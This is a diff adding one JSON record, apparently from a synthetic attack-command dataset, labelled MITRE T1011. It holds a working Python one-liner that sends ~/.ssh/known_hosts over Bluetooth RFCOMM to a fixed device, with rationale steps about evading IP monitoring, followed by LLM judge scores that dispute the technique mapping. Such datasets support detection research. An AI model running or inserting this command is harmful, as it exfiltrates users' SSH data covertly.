@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('24:71:89:5A:BC:10', 19)); p=os.path.expanduser('~/.ssh/known_hosts'); s.sendall(open(p,'rb').read()); s.close()\"",
+  "explanation": "Exfiltrates user-accessible SSH host metadata over Bluetooth RFCOMM (an alternate network medium) rather than the primary IP channel, aligning with T1011.",
+  "rationale_steps": [
+    "Select Bluetooth RFCOMM as a non-IP medium per T1011.",
+    "Open a user-level RFCOMM socket to a nonstandard channel (19).",
+    "Read ~/.ssh/known_hosts and transmit bytes over RFCOMM.",
+    "Close the socket to minimize observable artifacts in IP-based monitoring."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-71de9821",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is perfectly well-formed with balanced parentheses, proper quotes, valid socket parameters, correct exception handling, and proper file operations.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command is technically functional for exfiltrating SSH known_hosts data over Bluetooth, it does not align with T1011 (Search Closed Sources) which involves acquiring intelligence from non-public information sources rather than exfiltrating data.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T12:16:14.033371Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python code is perfectly well-formed, imports necessary modules, uses valid socket and file operations, and includes proper string and variable assignments within the `python3 -c` execution context.",
+        "semantic_score": 1,
+        "semantic_justification": "The command correctly attempts to exfiltrate a local file via Bluetooth, but this action is an exfiltration technique (e.g., T1041, T1048), not 'Search Closed Sources' (T1011), which pertains to acquiring intelligence from external non-public data sources.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T12:16:22.742648Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and parentheses with valid Python statements separated by semicolons; the -c argument and socket API usage are syntactically correct.",
+        "semantic_score": 4,
+        "semantic_justification": "It attempts to exfiltrate ~/.ssh/known_hosts over Bluetooth RFCOMM to a specified BD_ADDR, aligning with T1011 (exfiltration over other network medium), but relies on Bluetooth/RFCOMM support and a listening peer and does not match the provided 'Search Closed Sources' description.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T12:17:06.195915Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
